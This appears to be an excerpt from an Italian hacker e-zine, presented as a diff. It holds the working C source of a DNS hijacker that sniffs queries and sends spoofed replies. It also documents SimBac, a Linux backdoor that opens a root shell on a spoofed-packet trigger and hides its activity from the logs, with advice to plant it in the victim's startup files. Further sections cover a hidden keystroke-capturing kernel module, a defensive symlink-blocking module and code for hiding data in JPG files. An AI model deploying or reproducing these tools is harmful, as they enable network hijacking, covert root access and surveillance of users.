+} *psudp;
+
+/*---------------------------------------------------------------------------*/
+
+in_cksum (unsigned short *ptr, int nbytes)
+{
+
+  register long sum;		/* assumes long == 32 bits */
+  u_short oddbyte;
+  register u_short answer;	/* assumes u_short == 16 bits */
+
+  /*
+   * Our algorithm is simple, using a 32-bit accumulator (sum),
+   * we add sequential 16-bit words to it, and at the end, fold back
+   * all the carry bits from the top 16 bits into the lower 16 bits.
+   */
+
+  sum = 0;
+  while (nbytes > 1)
+    {
+      sum += *ptr++;
+      nbytes -= 2;
+    }
+
+  /* mop up an odd byte, if necessary */
+  if (nbytes == 1)
+    {
+      oddbyte = 0;		/* make sure top half is zero */
+      *((u_char *) & oddbyte) = *(u_char *) ptr;	/* one byte only */
+      sum += oddbyte;
+    }
+
+  /*
+   * Add back carry outs from top 16 bits to low 16 bits.
+   */
+
+  sum = (sum >> 16) + (sum & 0xffff);	/* add high-16 to low-16 */
+  sum += (sum >> 16);		/* add carry */
+  answer = ~sum;		/* ones-complement, then truncate to 16 bits */
+  return (answer);
+}
+
+void pcap_device_on(void)
+{
+ char            errbuf[400];
+ int datalink;
+
+ if (!deviceglobal || !strcmp(deviceglobal, "default")) {
+  deviceglobal=pcap_lookupdev(errbuf);
+  printf("Sniffing whith device :");
+  printf(" %s.\n\n", deviceglobal);
+  
+ }
+
+ if (!deviceglobal) {
+  printf("Error getting sniffing device - %s\n", errbuf);
+  exit(1);
+ }
+
+ pcap_global_descriptor =
+  pcap_open_live(deviceglobal, 68,1, 1000, errbuf);
+
+ if (!pcap_global_descriptor) {
+  printf("error opening pcap: %s\n", errbuf);
+  exit(1);
+ }
+
+ datalink = pcap_datalink(pcap_global_descriptor);
+
+ switch (datalink) {
+  case DLT_EN10MB:		
+                  offset = 14;
+                  break;
+  case DLT_NULL:
+  case DLT_PPP:	
+                  offset = 4;
+                  break;
+  case DLT_SLIP:
+                  offset = 16;
+                  break;
+  case DLT_RAW:
+		  offset = 0;
+		  break;
+  case DLT_SLIP_BSDOS:
+  case DLT_PPP_BSDOS:
+		  offset = 24;
+		  break;
+  default:
+                  printf("unknown datalink type (%d)", datalink);
+                  exit(-1); 
+ }
+}
+
+void ethclose()
+{
+ if(pcap_global_descriptor) pcap_close(pcap_global_descriptor);
+ printf("...DnsHijacking terminated.--\n");
+ printf("...remember to call Digital Skull BBS +39-2-93163367 24h/24h !!--\n\n");
+ exit(0);
+}
+
+void usage (void)
+{
+printf("Kundera DNS Hijacker v1.1\n");
+printf("Usage: kdh [-m monitor mode] -h ip_addr in the reply [-s ip_addr "\
+	"of client] [-t ttl of reply]\n");
+}
+
+void sniff_and_spoofreply(void)
+{
+struct ip          *IP;  
+struct udphdr      *UDP;   
+int ipsize,udpsize; 
+struct pcap_pkthdr lpcap_hdr;
+char 	*sniff_buff;
+char *packet;
+char *packetck;
+unsigned char *data;
+
+ if((sniff_buff=(char *) pcap_next(pcap_global_descriptor, &lpcap_hdr))){
+  (char *) sniff_buff+=offset; 
+  IP = (struct ip *) sniff_buff; 
+  
+if (IP->ip_p == IPPROTO_UDP){
+
+ipsize=sizeof(*IP);
+
+UDP = (struct udphdr *) ((char *)sniff_buff + ((int)IP->ip_hl << 2));
+    
+udpsize=sizeof(*UDP);
+
+if (((IP->ip_src.s_addr == ipclient)&& (ntohs(UDP->uh_dport)==53))||((ipclient==0)&& (ntohs(UDP->uh_dport)==53)))  {
+
+sourceip_addr = IP->ip_src; 
+destip_addr = IP->ip_dst; 
+udpsourceport = ntohs(UDP->uh_sport); 
+bzero(dnspayl,sizeof(dnspayl));
+printf("DNS query sniffed...from %s:%d\n",
+ inet_ntoa(sourceip_addr),udpsourceport);
+
+if (monitor == 0){
+
+dnsrecv = (struct dnshdr *)(sniff_buff+ipsize+udpsize); 
+dnspayload = (char *)(sniff_buff+ipsize+udpsize+sizeof(*dnsrecv));
+ 
+strcpy(dnsstring,dnspayload);
+ 
+memcpy(dnssend,dnsrecv,sizeof(*dnsrecv)+strlen(dnsstring)+5);
+       
+       dnssend->id=dnsrecv->id;         
+       dnssend->aa=1;  		        
+       dnssend->ra=1;                   
+       dnssend->qr=1;                   
+       dnssend->rep_num = htons(1);     
+       dnsquery=strlen(dnsstring)+5;
+       strncpy(data2+dnsquery,dnsstring,sizeof(dnsstring)+5);
+       dnsquery=dnsquery+strlen(dnsstring)+1;
+
+      *((u_short  *)(data2+dnsquery))  = htons(1);
+      *((u_short  *)(data2+dnsquery+2))= htons(1);
+      *((u_long *)(data2+dnsquery+4))  = htonl(ttlquery); /*ttl della query*/     
+      *((u_short  *)(data2+dnsquery+8))= htons(4);
+      *((u_long *)(data2+dnsquery+10)) = inet_addr(ipquery);
+
+      dnsquery=dnsquery+14; 
+
+      if ( (sok=socket(AF_INET,SOCK_RAW,IPPROTO_RAW)) < 0)
+      {
+   	 printf("Errore nella creazione del socket.\n");
+         exit(EXIT_FAILURE);
+      }
+
+      opt=1;
+      if (setsockopt(sok,IPPROTO_IP,IP_HDRINCL,&opt,sizeof(opt)) < 0)
+      {
+          printf("Errore nelle opzioni del socket.\n");
+          exit(EXIT_FAILURE);
+      }
+
+      packet = ( char * )malloc( ipsize + udpsize + dnsquery + 12 );
+
+      IP     = (struct ip     *)packet; 
+
+      memset(packet,0,sizeof(packet)); 
+        
+        IP->ip_src.s_addr  = destip_addr.s_addr;
+        IP->ip_dst.s_addr  = sourceip_addr.s_addr;
+        IP->ip_v = 4;
+        IP->ip_hl = 5;
+        IP->ip_ttl = 245;
+        IP->ip_id = htons(666);
+        IP->ip_p = 17;
+        IP->ip_len  = htons(ipsize + udpsize + dnsquery+12);
+        IP->ip_sum    = in_cksum((u_short *)packet,ipsize);
+ 
+      UDP = (struct udphdr    *)(packet+ipsize);
+      UDP->uh_sport = htons(53); 
+      UDP->uh_dport = htons(udpsourceport);
+      UDP->uh_ulen = htons(udpsize+dnsquery+12);
+      UDP->uh_sum = 0;
+      packetck = (char *)malloc(udpsize + dnsquery + 12 + 
+                 sizeof(struct pseudoudp));
+      bzero(packetck,udpsize + dnsquery + 12 + sizeof(struct pseudoudp));     
+      psudp = (struct pseudoudp *) (packetck);
+      psudp->ipsource = destip_addr.s_addr;
+      psudp->ipdest = sourceip_addr.s_addr;
+      psudp->zero = 0;
+      psudp->proto = 17;
+      psudp->length = htons(udpsize+dnsquery+12);
+      memcpy(packetck+sizeof(struct pseudoudp),UDP,udpsize+dnsquery+12);
+      memcpy(packetck+sizeof(struct pseudoudp)+udpsize,dnspayl,dnsquery+12);
+
+      UDP->uh_sum   = in_cksum((u_short *)packetck,udpsize+dnsquery+12+
+                      sizeof(struct pseudoudp));    
+
+      data   = (unsigned char    *)(packet+ipsize+udpsize);
+      memcpy(data,dnspayl,dnsquery+12);
+
+      dest.sin_family=AF_INET;
+      dest.sin_addr.s_addr=destip_addr.s_addr;
+
+      if((sendto(sok,packet,ipsize+udpsize+dnsquery+12,0,( struct sockaddr * ) 
+                 &dest,sizeof(dest)))<0)
+      {
+           printf("Error sending packet.\n");
+           exit(EXIT_FAILURE);
+      }
+
+      printf("Spoofed reply sent.\n");
+      close(sok);
+    }
+  }
+ }
+ }
+}
+
+int main(int argc,char **argv){
+
+if (argc < 2){
+usage();
+exit(1);
+}
+
+while((c=getopt(argc,argv,"h:t:s:m"))!=EOF){
+	switch(c) {
+	 case 'h': ipquery=optarg; break;
+	 case 't': ttlquery=atol(optarg); break;
+       case 's': ipclient=inet_addr(optarg); break;
+       case 'm': monitor = 1;
+	 }
+}
+
+signal(SIGINT,  ethclose);  
+signal(SIGTERM, ethclose);
+signal(SIGKILL, ethclose);
+signal(SIGQUIT, ethclose);
+dnssend = (struct dnshdr  *)dnspayl;
+data2   = (char *)(dnspayl+12); 
+
+if (monitor == 1){
+printf("Monitoring mode ...\n");
+}else{
+printf("Sniff & reply mode ...\n");
+}
+
+pcap_device_on(); 
+
+while(1){
+
+sniff_and_spoofreply();
+
+}
+}
+<-X->
+
+
+--[ SimBac: Simple Backdoor v 0.0 alpha beta gamma delta
+---[ Tharkas <tharkas@tiscalinet.it> - http://tharkas.mascanc.net
+
+DISCLAIMER: L'autore del presente articolo e del programma SimBac non ha
+nessuna responsabilita` dei danni che i file contenuti nel pacchetto
+simbac.tar.gz possono provocare al vostro o ad altri computer, se usati in
+modo scorretto.
+
+Dedica: Quattro parole... Eleonora, io ti amo.
+
+Fanculo a: Gli amici che ti stanno vicino finche` non osi criticarli quando
+           fanno stronzate.
+
+Indice
+
+	1. DISCLAIMER
+	2. SALUTI DEL CAZZO
+	3. COS'E' SIMBAC ?
+	4. CONFIGURAZIONE
+	5. INSTALLAZIONE
+	6. USO
+	7. BUGS CONOSCIUTI
+	8. COMPATIBILITA'
+	9. MIGLIORAMENTI PREVISTI
+       10. CONCLUSIONI
+
+3. COS'E` SIMBAC ?
+
+Si tratta di una backdoor esclusivamente per sistemi linux (testata su kernel
+2.2.x o superiori, non avendo a disposizione un 2.0.x) costruita in tre parti:
+il server (1), che si occupa di ricevere pacchetti spoofati dal client (2), e
+nel caso sia stato adeguatamente 'sollecitato', fa partire il modulo (3), che
+si occupa di nascondere allegramente la nostra identita` ai log impedendo al
+sistema di scriverli.
+
+Tutto questo si traduce in una invisibilita` pressoche` completa... (perche`
+pressoche`? Vedere i paragrafi "miglioramenti previsti" e "bugs"). Ma ora
+basta gonfiarsi il petto e vantarsi smisuratamente (e senza motivo),
+passiamo ai dati tecnici!
+
+4. CONFIGURAZIONE
+
+Per configurare questo programma, avrete bisogno di smanettare nelle righe
+iniziali dei sorgenti:
+
+ - Il file server.c contiene dei #define che vanno cambiati a seconda
+    delle vostre esigenze:
+
+#define PASSWORD "simbac"
+#define INSMOD_PATH "/sbin/insmod"
+#define MODULE_PATH "./module.o"
+#define RMMOD_PATH "/sbin/rmmod"
+#define MODULE_NAME "module"
+
+ - Il file module.c contiene un'unico define, MODULE_NAME, che deve essere
+    accordato con quello del server.c .
+
+"E non potevi scrivere qualcosa di interattivo per inserire i dati durante
+l'installazione ?" "Si`."
+...
+"Perche` non l'hai fatto?" "Nessuno ha detto che i miei programmi devono
+essere usati da individui dotati dell'intelligenza di un turacciolo."
+
+5 - INSTALLAZIONE
+
+Per il server 'make server'.
+Per il client 'make client'.
+
+Non ci dovrebbero essere particolari problemi, no ? =)
+
+6 - USO
+
+Premesso che sarebbe meglio imboscare l'apertura del server nei file di avvio
+del sistema bersaglio, eccovi una piccola dimostrazione.
+
+[root@localhost simbac]# ./server
+[root@localhost simbac]# ./client
+Usage:
+        ./client <host> <port> <myhost>
+[root@localhost simbac]# ./client localhost 110 ciaociao
+        SimBac client v0.0 Alpha Beta Gamma Delta by Tharkas
+        Dedicated to.. Eleonora.
+Password:
+[root@localhost simbac]# telnet localhost 110
+Trying 127.0.0.1...
+Connected to localhost.localdomain (127.0.0.1).
+Escape character is '^]'.
+sh: no job control in this shell
+sh-2.04# echo ciaociao
+sh-2.04# exit
+Connection closed by foreign host.
+
+Come avete visto, il tentativo di scrivere 'ciaociao' di una write() e`
+stato intercettato e bloccato.
+
+In un contesto reale, 'ciaociao' sarebbe stato l'host della macchina
+dell'attacker, e al modulo sarebbe stato passato anche l'ip in forma di
+stringa, per ottenere lo stesso comportamento.
+
+NOTA: mi scuso per avervi solo potuto mostrare una dimostrazione su lo...
+Un altro computer e un paio di schede di rete sarebbero un regalo gradito
+per il prossimo programma :P
+
+A proposito: se volete riattivare la shell dopo averla chiusa dovete
+necessariamente riutilizzare il client: non sarebbe una bella cosa
+lasciare una rootshell aperta per 50 ore su un sistema in attesa della
+vostra venuta, eh ? =)
+
+7 - BUGS CONOSCIUTI
+
+ - E' sconveniente provare a scrivere una delle frasi 'proibite' in un
+ambiente X, perche` si va incontro ad un effetto variabile tra il blocco
+del programma in questione per qualche secondo ed il crash di X.
+A occhio (cioe` senza uno studio approfondito), questo effetto e`
+probabilmente dato dallo scombussolamento generato da una frase non
+scritta che il computer crede di aver scritto. (Periodo un po' contorto,
+ma tant'e`...)
+
+ - Non da` garanzie di funzionamento per i sistemi su cui non e` stato
+testato SimBac (paragrafo "COMPATIBILITA`").
+Del resto, non da` garanzie di funzionamento neppure per quelli che ho
+testato =)
+
+8 - COMPATIBILITA`
+
+SimBac e` stato testato su:
+
+ - RedHat Linux 7.1 e 7.2 (e chi si ricorda la versione del kernel? Le ho
+    messe su solo per vedere se andava il prog..)
+
+ - Slackware 7.0, kernel 2.2.13 e 2.4.0 (dist vecchiotta, ma insuperabile)
+
+Punto. Che vi aspettavate? Che vi dicessi che gira anche su AIX? :P
+
+9. MIGLIORAMENTI PREVISTI
+
+Il difetto principale del programma e` che il ps 'vede' il server... Ma
+questo non e` correggibile se non con un altro modulo o con un rootkit.
+Questa operazione e` alla portata di qualunque marmocchio. :P
+
+10. CONCLUSIONI
+
+Molti mi hanno chiesto per quale motivo ho rilasciato un sorgente che
+poteva essere molto piu` completo.. Il motivo e` semplice.
+Anzi, ci sono due motivi.
+
+1 - Le modifiche da apportare per migliorarlo sono talmente ridicole che
+anche il turacciolo di cui parlavo sopra sarebbe in grado di apportarle.
+Non dico questo perche` ritengo il mio programma perfetto, ma semplicemente
+perche` lo 'scheletro' esiste gia` e aggiungere nuova robba e` semplice.
+(piccolo indizio: case-sensitive).
+
+2 - Non ho nessuna intenzione di rilasciare un programma che
+potenzialmente potrebbe provocare seri danni a qualche povera azienda.. Se
+volete far danno, accomodatevi, ma prima avrete da aggiustare.
+
+Ogni commento e` futile, non cambiera` idea. (Dico questo perche` c'e` stata
+molta insistenza da questo punto di vista).
+
+Bene, io ho finito.. Divertitevi con il mio programmuccio... E cercate di
+non farvi beccare.
+
+ - Tharkas (tharkas@tiscalinet.it)
+
+PS: l'ho gia` detto, pero`.. Eleonora ti amo!
+
+[ NDR: i file del progetto sono in attachment/simbac.tar.gz ]
+
+
+--[ Moj0 v0.1
+---[ uLiX <uLiX@gmx.it>
+
+Ecco che seguendo i passi di vecna, e trovando affatto difficile il modulo per
+freebsd che intercettava la SYS_ioctl per catturare le password tipate senza
+echo via terminale, ho provato a mettere in pratica l'esempio.
+
+Ora, Moj0_lkm e' un moduletto semplice semplice che intercetta la SYS_write e
+salva il contenuto di tutto il buffer che e' passato come secondo argomento
+della suddetta syscall su di un file a scelta, il che equivale a dire che ogni 
+qualvolta un programma utilizzera` questa syscall (e sono moltissimi...) tutto
+cio` che e` letteralmente letto verra` intercettato.
+
+Puramente dal lato admin, (anche se io non lo userei, per tutte le paranoiche 
+questioni sulla privacy...), il moduletto va a pennello: ti viene il dubbio
+che un utente disgraziato stia manipolando a suo piacere, dopo aver
+conquistato la root, la tua box, e tu carichi il modulo; se l'utente e`
+connesso in quel momento, al 99% riuscirai a vedere cosa *digita* da un
+qualsiasi terminale.
+
+L'idea m'e` venuta quando un giorno uno stronzetto di mio amico vero si e` 
+connesso alla mia box: da un momento all'altro vedevo solo la connessione via
+netstat o altri tooletti belli belli, ma *non* sapevo proprio cosa facesse...
+(naturalmente non ho usato nessuno snifero, e poi da locale cosa accade?...):
+alla fine gli ho killato la connessione per puro piacere di farlo, e perche`
+il dubbio aveva preso oramai il sopravvento.
+
+Risolto questo mio problema, (anche se di tool cosi` ce ne sono un'infinita`,
+e anche di migliori sicuramente...), ora sto in pace con me stesso...
+
+Notate bene: le password non ve le sniffera` mai, metteteci voi le manuccie 
+sopra, magari con la SYS_read direttamente... ma sta a voi...
+
+Il Makefile e` 'na cazzata, e per compilare come al solito tipate *make*.
+Se volete che il modulo non sia visibile e tutto sia messo a posto con un 
+semplice comandino, tipate *make up*, e il modulo s'installera`, dopo di lui
+un altro (rippato e adattato da adore, ma leggete il sorgente...) nascondera`
+il primo e poi si auto disinstallera'...
+Se *non* volete, insmod Moj0_lkm.o etcetera etcetera...
+
+Di optioni ne ha solo una, che e` un paramentro:
+
+[root@SOfTHACk: ~/LKM/Moj0-0.1]# insmod Moj0_lkm.o log=/tmp/tty.log
+
+logghera` tutto in tty.log nella tmp dir...
+
+Di default ci sta /dev/tty12, che di solito non si usa, ma poi scegliete pure
+voi. Particolarita` di log su file e` che le seq di escape e compagnia bella
+non sono interpretate dal terminale, per esempio, e quindi ve le ritroverete 
+tutte li` sul file... cazzate so'...
+
+Per ora non potete scegliere il terminale da loggare, e per ora il mod
+logghera` solo terminali, o qualsiasi cosa abbiate sulla vostra box con major
+number uguale a 4...
+
+Dopo di che, sto abbastanza strano: 
+* primo, divertitevi...
+* sec, non fate cazzate (di tutti i generi...)...
+* ultimo, codate...
+
+Thnx a vecna, BFi, L0RDBUFFY, ELeN, S..., moduli e sourecs, linux, linus, pc,
+mo sto stronzando veramente, ecc, ecc...
+
+Scrivete volendo...
+                                                            uLiX <uLiX@gmx.it>
+
+[ NDR: i file del progetto sono in attachment/Moj0-0.1.tar.gz ]
+
+
+--[ STR0NG
+---[ syscalo <x4sys@bigfoot.com>
+
+Modulo del kernel per impedire la creazione di link simbolici a file con
+attributo +i o +a.
+
+L'idea mi e` venuta seguendo la discussione su una ml per impedire lo
+sfuttamento di un bug di un programma di prova che gira con permessi di root e
+apre un file in /tmp scrivendoci l'input dell'utente; in questo modo creando
+un link simbolico al file passwd e poi shadow e` possibile crearsi un nuovo
+account con accesso root.
+Il bug di questa tecnica e` che cancella tutti gli altri account, ma come e`
+stato fatto notare vengono mantenute delle copie di backup di questi file, e
+quindi il loro ripristino da parte dell'attaccante e` immediato!
+La soluzione sembrava il settaggio dell'attributo +i per i file in questione,
+ma purtroppo questo impedisce la creazione solo degli hard link.
+
+A questo punto arriva StronG, che `hookando' la syscall symlink, controlla che
+il file che si vuole linkare non abbia attributi +i o +a; se cosi` fosse viene
+impedita la creazione del link simbolico.
+
+Non c'e` altro da aggiungere, vi lascio alla lettura del sorgente C.
+
+<-| threads/StronG.c |->
+/*
+ * StronG
+ * Impedisce la creazione di link simbolici ai file con attributo +i o +a
+ * Compilazione: gcc -c -O2 -fomit-frame-pointer StronG.c
+ * Installazione: insmod StronG.o
+ * Rimozione: rmmod StronG
+ *
+ * NOTA: il codice per la funzione strong_symlink e' tratto dalla funzione
+ *       do_link presente in /usr/src/linux/fs/namei.c
+ *
+ * syscalo <x4sys@bigfoot.com>
+ */
+ 
+#define MODULE
+#define __KERNEL__
+
+#define MYNAME "StronG"
+
+#include <linux/module.h>
+#include <linux/modversions.h>
+#include <linux/kernel.h>
+#include <linux/mm.h>
+#include <linux/smp_lock.h>
+#include <sys/syscall.h>
+
+extern void *sys_call_table[];
+
+int (*hooked_symlink)(const char *, const char *);
+
+int strong_symlink(const char * oldname, const char * newname)
+{
+	struct dentry *old_dentry;
+	struct inode *inode;
+	int error;
+
+	lock_kernel();
+
+	old_dentry = lookup_dentry(oldname, NULL, 0);
+	error = PTR_ERR(old_dentry);
+	if (IS_ERR(old_dentry))
+		goto exit_lock;
+
+	error = -ENOENT;
+	inode = old_dentry->d_inode;
+	if (!inode)
+		goto exit_lock;
+
+	error = -EPERM;
+	if (IS_APPEND(inode) || IS_IMMUTABLE(inode))
+		goto exit_lock;
+
+	error = hooked_symlink(oldname, newname);
+
+exit_lock:
+	unlock_kernel();
+	return error;
+}
+
+
+int init_module()
+{
+        hooked_symlink = sys_call_table[SYS_symlink];
+        sys_call_table[SYS_symlink] = strong_symlink;
+
+        printk(KERN_INFO "%s loaded\n", MYNAME);
+        return 0;
+}
+
+void cleanup_module()
+{
+        sys_call_table[SYS_symlink] = hooked_symlink;
+        printk(KERN_INFO "%s removed\n", MYNAME);
+}
+<-X->
+
+That's all!
+bye syscalo
+
+
+--[ NASC0NDERE DATi iN UN FiLE JPG
+---[ ORK <orkmail@katamail.com>
+
+<---------------------------------------------------------------------------->
+<-    __   ___   _     ----->>---- Nascondere dati in un file JPG ----<<----->
+<-   /  \ |   \ | | /\ ------------------------------------------------------>
+<-  / /\ \| |\ \| |/ / --- Autore: --------------- ORK ---------------------->
+<- / /__\ \    /|   /  ----Contatti: ------------- orkmail@katamail.com ----->
+<- \______/ |\ \| | \  ------------------------------------------------------>
+<---------|_| \_\_|\_\ ------------------------------------------------------>
+<---------------------------------------------------------------------------->
+
+Indice:
+
+0 - Introduzione
+1 - Il formato di un file JPG
+2 - L'idea
+3 - L'implementazione
+4 - I possibili impieghi
+5 - Riferimenti
+
+0 - Introduzione
+----------------
+Leggendo l'articolo di valv{0} sul numero 9 di BFi mi e' tornata in mente 
+un'idea che mi era passata per la testa un po' di tempo fa.
+
+Fondamentalmente il problema e' sempre quello: come comunicare dati a
+qualcuno in modo insospettabile e con il minimo rischio di essere scoperti???
+L'idea ce l'ha data valv{0} nel suo articolo (in realta' io ci stavo pensando
+da un po' di tempo), ovvero nascondere i dati all'interno di qualcosa di
+insospettabile... e cosa puo' essere piu' insospettabile delle foto della
+cresima di vostro fratello, scattate con la vostra macchina digitale??? 
+
+Come avrete capito, quello che sto proponendo e' inserire dei dati all'interno
+di files di immagini, in particolare all'interno di files JPG.
+La scelta di usare i files JPG per nascondere dei dati non e' stata presa
+casualmente. I files JPG negli ultimi anni hanno visto una diffusione 
+altissima, infatti li si puo' trovare dovunque, partendo dalla maggior parte 
+dei siti web, per arrivare agli album fotografici digitali. Sicuramente se 
+provate a lanciare il seguente comando
+
+$ find / -name *.jpg
+
+nei vostri computer di casa salteranno fuori diverse centinaia di files
+(meglio sorvolare su che immagini sono :)
+Percio' per il principio che le cose si nascondono meglio nella confusione e
+all'interno di altre cose che non attirano l'attenzione i files JPG mi sono 
+sembrati la scelta migliore. 
+Come ha detto valv{0} nel suo articolo, comunque, la maggior parte dei formati
+complessi puo' essere usato come cavallo di Troia :)
+
+1 - Il formato di un file JPG
+-----------------------------
+I files JPG sono formati da un certo numero di segmenti, ognuno dei quali puo'
+essere lungo al massimo 65535 (2^16) Byte ed inizia con un marcatore. Ogni 
+marcatore e' formato da 2 Byte, il primo sempre con valore 0xFF ed il secondo
+con un valore compreso tra 0x01 e 0xFE. Il secondo byte specifica il tipo di 
+marcatore. Se il segmento contiene dei dati i 2 Byte che seguono il marcatore
+indicano la grandezza dei dati. Se, invece, il segmento non contiene dati dopo
+il marcatore comincia subito il segmento successivo.
+
+Ogni segmento percio' ha la seguente struttura:
+ 
+[FFxx][nnnn][dati]
+ ^     ^     ^
+ |     |     Dati (nnnn Byte - 2)                           ) Parti 
+ |     Intero contenente la lunghezza dei dati + 2 (2 Byte) ) Facoltative
+ Marcatore (2 Byte) 
+
+Si noti che il numero contenente la grandezza dai dati e' memorizzato con la
+notazione Bin Endian, e non Little Endian come si e' abituati nei sistemi x86.
+ 
+Tutti i files JPG iniziano con un segmento senza dati identificato dal
+marcatore FFD8 e terminano con un segmento sempre senza dati identificato dal
+marcatore FFD9. Tra questi 2 segmenti si possono trovare un numero qualsiasi 
+di altri segmenti. 
+
+Per capire meglio si prenda in esempio la seguente rappresentazione
+esadecimale (parziale) di un file JPG. Come si puo' vedere i primi 2 byte
+sono esattamente il marcatore di inizio immagine FFD8. Siccome questo 
+marcatore non prevede dati aggiuntivi per il segmento i seguenti 2 Byte
+dovranno essere per forza il marcatore di un nuovo segmento. Ed infatti e' 
+proprio cosi', il segmento seguente e' identificato dal marcatore FFE0.
+Siccome questo marcatore prevede dati, i seguenti 2 Byte identificano la
+grandezza della parte dati del segmento.
+A questo punto per sapere a che indirizzo inizia il segmento successivo basta
+sommare all'indirizzo del Byte successivo al marcatore la grandezza della
+parte dati, quindi 0x00000004 + 0x0010 = 0x00000014. A questo indirizzo 
+infatti si trova proprio FFED che e' un marcatore valido. Gli ultimi 2 Byte
+del file sono FFD9 ovvero il marcatore che identifica la fine dell'immagine.
+
+00000000 FFD8 FFE0 0010 4A46 4946 0001 0201 012C ......JFIF.....,
+00000010 012C 0000 FFED 00AA 5068 6F74 6F73 686F .,......Photosho
+00000020 7020 332E 3000 3842 494D 03ED 0000 0000 p 3.0.8BIM......
+00000030 0010 012B FFD9 0002 0002 012B FFD9 0002 ...+.......+....
+00000040 0002 3842 494D 03F3 0000 0000 0008 0000 ..8BIM..........
+00000050 0000 0000 0000 3842 494D 2710 0000 0000 ......8BIM'.....
+00000060 000A 0001 0000 0000 0000 0002 3842 494D ............8BIM
+00000070 03F4 0000 0000 0012 0035 0000 0001 002D .........5.....-
+...
+...
+...
+00006780 E8DF 87EC D37C 8B6B 5F6F E1EB 5DF1 4D07 .....|.k_o..].M.
+00006790 D7F5 053A 573A 469D CFD0 4AF5 A60D DF3F ...:W:F...J....?
+000067A0 FFD9                                    ..
+
+In realta' le cose sono un po' piu' complicate, ma per la comprensione e la
+realizzazione di quello che voglio proporre non serve sapere di piu'.
+
+2 - L'idea
+----------
+L'idea che mi e' venuta per nascondere i dati e' molto semplice.
+Ogni immagine comincia con il marcatore FFD8 e termina con il marcatore FFD9.
+Tutti gli eventuali dati che seguono quest'ultimo marcatore vengono ignorati
+dai browser o dai programmi di gestione di immagini in quanto l'immagine e' 
+gia' terminata. Quindi un ottimo posto dove nascondere i dati e' proprio la 
+parte finale del file. 
+
+Per provare che il tutto non crea problemi ai programmi di gestione di 
+immagini provate a lanciare un comando del genere
+
+$cat trash >> image.jpg
+
+e poi provate ad aprire l'immagine. Non noterete niente di strano.
+Se al posto di accodare trash si accodasse un file contenente dati
+significativi (ovviamente criptati... la prudenza non e' mai troppa) si
+otterrebbe un file JPG perfettamente funzionante, contenente i nostri dati.
+Per la maggior parte della gente questa sembrera' un'immagine normalissima, 
+mentre per quelli che invece conoscono il segreto questa immagine acquistera'
+un valore particolare.
+
+Di seguito riporto i listati di due programmini pseudo-idioti che si occupano
+rispettivamente di criptare e fondere un file contenente dei dati con un file
+JPG e di estrarre e decriptare i dati precedentemente inseriti.
+
+Breve descrizione di JPG-Fusion.c
+Richiede in input 3 nomi di files: il nome del file JPG, il nome del file
+contenente i dati da nascondere e il nome di file che verra' creato.
+Il programma banalmente copia il contenuto del file JPG nel nuovo file, cripta
+il file di dati e lo accoda sempre al nuovo file creato.
+Come algoritmo di criptazione e' stato usato un algoritmo a chiave simmetrica.
+La chiave di 16 Byte viene creata prendendo 16 Byte casuali del file JPG. I
+dati vengono criptati facendo lo XOR tra essi e la chiave. Viene sfruttato il
+fatto che A XOR B = C e C XOR B = A.
+Il programma restituisce 2 numeri che sono necessari a JPG-Split.c per 
+recuperare i dati. Il primo numero non e' altro che la grandezza del file JPG,
+sapendo questo ovviamente si sa dove comincia il file dati. Il secondo numero 
+invece e' il numero di Byte del file JPG da cui si comincia a prelevare la 
+chiave per criptare.
+
+Possibili Miglioramenti: 
+- Sarebbe possibile senza troppi sforzi inserire anche il nome del file di
+  dati all'interno del file di Output. Per il momento il nome del file viene
+  perso, lo si deve infatti fornire in input a JPG-Split.
+- Volendo si potrebbe cambiare algoritmo di criptazione in uno a chiave 
+  pubblica e privata.
+- Si potrebbe aggiungere alla fine del file creato il marcatore di fine
+  immagine (FFD9) cosi' che il file possa sembrare corretto ad un'analisi
+  superficiale.
+
+Breve descrizione di JPG-Split.c
+Richiede in input 4 parametri: il nome del file da cui prelevare i dati, il 
+nome del file da creare, la lunghezza del file JPG e il numero del Byte da
+cui iniziare a creare la chiave per decriptare i dati.
+Il programma banalmente estrae i dati, li decripta e li salva sul file.
+
+Possibili Miglioramenti: 
+- Sarebbe possibile trovare in maniera automatica la lunghezza del file JPG
+  in base alla posizione del marcatore FFD9.
+
+3 - L'implementazione
+---------------------
+<-|jpg/JPG-Fusion.c |->
+/*
+<---------------------------------------------------------------------------->
+<-    __   ___   _       ----->>----          JPG-Fusion.c          ----<<--->
+<-   /  \ |   \ | | /\   ---                                                ->
+<-  / /\ \| |\ \| |/ /   ---         Sorgente allegato all'articolo         ->  
+<- / /__\ \    /|   /    ---        "Nascondere dati in un file JPG"        ->
+<- \______/ |\ \| | \    ---                                                ->
+<-        |_| \_\_|\_\   ---------------------------------------------------->
+<---------------------------------------------------------------------------->
+*/
+
+#include <stdio.h>
+#include <time.h>
+
+void cript (char *, char *, int);
+
+main(int argc, char *argv[]) 
+{
+FILE *file1, *file2, *file3;
+char *tutto1, *tutto2, pad[16];
+long file1lung, file2lung;
+int startpad;
+time_t secondi;
+
+if (argc<4)
+ {
+   printf("USO: %s file1 file2 file3:\n",argv[0]);
+   printf("file1 - file JPG\n");
+   printf("file2 - file da nascondere\n");
+   printf("file3 - nome del file di Output\n");
+   exit(-1);
+ }
+
+
+file1 = fopen(argv[1], "r");
+if (file1 == NULL) 
+ {
+   printf("Errore di apertura nel file %s\n",argv[1]);
+   exit(-1);
+ }
+
+file2 = fopen(argv[2], "r");
+if (file2 == NULL) 
+ {
+   printf("Errore di apertura nel file %s\n",argv[2]);
+   exit(-1);
+ }
+
+file3 = fopen(argv[3], "w");
+if (file3 == NULL) 
+ {
+   printf("Errore di apertura nel file %s\n",argv[3]);
+   exit(-1);
+ }
+
+/* Trova la lunghezza dei 2 files */
+
+fseek(file1, 0, SEEK_END);
+file1lung = ftell(file1);
+rewind(file1);
+
+fseek(file2, 0, SEEK_END);
+file2lung = ftell(file2);
+rewind(file2);
+
+/* Legge il contenuto dei 2 files */
+
+tutto1 = (char *) malloc(file1lung);
+fread(tutto1, 1, file1lung, file1);
+
+tutto2 = (char *) malloc(file2lung);
+fread(tutto2, 1, file2lung, file2);
+
+/* Crea la chiave che servira' per criptare i dati */
+
+secondi = time(NULL);
+srand(secondi);
+startpad = rand();
+startpad= startpad%(file1lung-16);
+strncpy(pad, tutto1+startpad, 16);
+
+/* Cripta i dati */
+
+cript(tutto2, pad, file2lung);
+
+/* Crea il file scrivendo prima il file JPG e poi i dati criptati */
+
+fwrite (tutto1, 1, file1lung, file3);
+fwrite (tutto2, 1, file2lung, file3);
+
